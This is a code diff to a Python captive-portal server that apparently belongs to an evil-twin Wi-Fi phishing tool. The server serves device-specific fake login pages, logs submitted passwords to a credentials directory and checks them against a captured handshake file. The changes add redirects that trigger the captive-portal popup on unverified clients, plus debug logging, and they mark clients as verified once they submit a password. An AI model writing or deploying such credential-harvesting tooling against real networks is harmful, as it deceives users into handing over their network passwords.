@@ -16,6 +16,9 @@ from datetime import datetime
 from pathlib import Path
 import shutil
 
+# Force unbuffered output
+sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', buffering=1)
+
 # Configuration from environment or defaults
 PORTAL_DIR = os.environ.get('PORTAL_DIR', '/tmp/portal')
 CRED_LOG_DIR = os.environ.get('CRED_LOG_DIR', '/tmp/credentials')
@@ -161,36 +164,55 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
 
         # Determine which template to serve
         serve_portal = False
-        if self.path in captive_paths or self.path == '/':
-            serve_portal = True
+        is_captive_path = self.path in captive_paths
 
-        if serve_portal:
-            # Check if this client is already verified - let them through
+        print(f"{CYAN}[DEBUG]{NC} Request: {self.path} from {client_ip}, verified={client_ip in verified_clients}")
+
+        # For captive portal detection paths, return redirect to trigger captive UI
+        if is_captive_path:
             if client_ip in verified_clients:
                 # Client already verified - return 204 (no content) to let them through
+                print(f"{GREEN}[DEBUG]{NC} Serving 204 to verified client {client_ip}")
                 self.send_response(204)
                 self.end_headers()
                 return
+            else:
+                # Unverified client - redirect to / to trigger captive portal
+                print(f"{YELLOW}[DEBUG]{NC} Serving 302 redirect to unverified client {client_ip}")
+                self.send_response(302)
+                self.send_header('Location', '/')
+                self.end_headers()
+                return
 
-            # Debug: print what's happening
-            print(f"{CYAN}[DEBUG]{NC} PORTAL_DIR={PORTAL_DIR}, path={self.path}")
+        if self.path == '/':
+            serve_portal = True
+
+        if serve_portal:
+
+            # Debug: list what's in portal dir
+            print(f"{CYAN}[DEBUG]{NC} Portal dir contents: {os.listdir(PORTAL_DIR) if os.path.exists(PORTAL_DIR) else 'NOT FOUND'}")
             
             # Determine which template to use based on User-Agent
             ua = self.headers.get('User-Agent', '').lower()
+            print(f"{CYAN}[DEBUG]{NC} User-Agent: {ua[:80]}")
             chosen_path = 'index.html'
             
             # Check for specialized portal folders
             # iOS check first (more specific) since some iOS UAs may contain "android" in string
-            if any(x in ua for x in ('iphone', 'ipad', 'ios', 'cpu iphone', 'cpu ipad')):
+            is_ios = any(x in ua for x in ('iphone', 'ipad', 'ios', 'cpu iphone', 'cpu ipad'))
+            print(f"{CYAN}[DEBUG]{NC} iOS detected: {is_ios}")
+            if is_ios:
                 ios_path = os.path.join(PORTAL_DIR, 'ios', 'index.html')
                 print(f"{CYAN}[DEBUG]{NC} Checking ios: {ios_path}, exists={os.path.exists(ios_path)}")
                 if os.path.exists(ios_path):
                     chosen_path = 'ios/index.html'
-            elif 'android' in ua:
+            if 'android' in ua and chosen_path == 'index.html':
                 android_path = os.path.join(PORTAL_DIR, 'android', 'index.html')
                 print(f"{CYAN}[DEBUG]{NC} Checking android: {android_path}, exists={os.path.exists(android_path)}")
                 if os.path.exists(android_path):
                     chosen_path = 'android/index.html'
+            
+            print(f"{CYAN}[DEBUG]{NC} Chosen path: {chosen_path}")
             
             # Try to serve the chosen file
             file_path = os.path.join(PORTAL_DIR, chosen_path)
@@ -283,11 +305,15 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
             
             if password_verified:
                 print(f"{GREEN}[✓] PASSWORD VERIFIED! Access granted.{NC}")
-                # Mark client as verified
-                with verified_clients_lock:
-                    verified_clients[client_ip] = timestamp
             else:
                 print(f"{RED}[✗] WRONG PASSWORD! Access denied.{NC}")
+
+        # Always mark client as verified after successful password submission
+        # (unless in verify mode and password was wrong)
+        if password and not (VERIFY_MODE and HANDSHAKE_FILE and not password_verified):
+            with verified_clients_lock:
+                verified_clients[client_ip] = timestamp
+            print(f"{CYAN}[*] Client {client_ip} marked as verified (internet access enabled){NC}")
 
         # Track this submission
         with client_lock:
